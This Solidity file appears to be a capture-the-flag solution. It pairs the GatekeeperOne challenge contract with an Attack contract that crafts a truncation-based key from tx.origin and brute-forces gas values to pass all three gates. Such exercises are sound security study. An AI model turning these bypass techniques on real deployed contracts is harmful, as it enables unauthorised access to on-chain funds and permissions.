pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Attack {
    function attack(address target) external returns(uint256){
        uint16 num = uint16(uint160(tx.origin));
        bytes8 gateKey = convertBytesToBytes8(abi.encodePacked("0xf6", uint16(0x0), num));
        for (uint256 i = 0; i <= 8191; i++) {
           try GatekeeperOne(target).enter{gas: 800000 + i}(gateKey) {
                return 800000 + i;
           }catch{

           }
        }
        return 0;
    }

    function convertBytesToBytes8(bytes memory inBytes) public pure returns (bytes8 outBytes8) {
        if (inBytes.length == 0) {
            return 0x0;
        }

        assembly {
            outBytes8 := mload(add(inBytes, 32))
        }
    }
}